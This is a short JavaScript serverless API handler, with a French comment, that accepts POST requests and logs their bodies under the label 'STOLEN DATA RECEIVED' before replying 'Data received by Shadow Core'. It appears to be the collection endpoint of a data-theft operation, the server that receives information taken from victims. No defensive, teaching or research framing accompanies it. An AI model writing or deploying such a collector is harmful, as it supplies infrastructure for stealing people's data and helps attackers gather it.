export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
            const data = req.body;
            
            // Stocker les données dans un log
            console.log('🔐 STOLEN DATA RECEIVED:', {
                timestamp: new Date().toISOString(),
                data: data
            });
            
            res.status(200).json({ 
                status: 'success',
                message: 'Data received by Shadow Core'
            });
        } catch (error) {
            res.status(500).json({ error: 'Internal server error' });
        }
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
}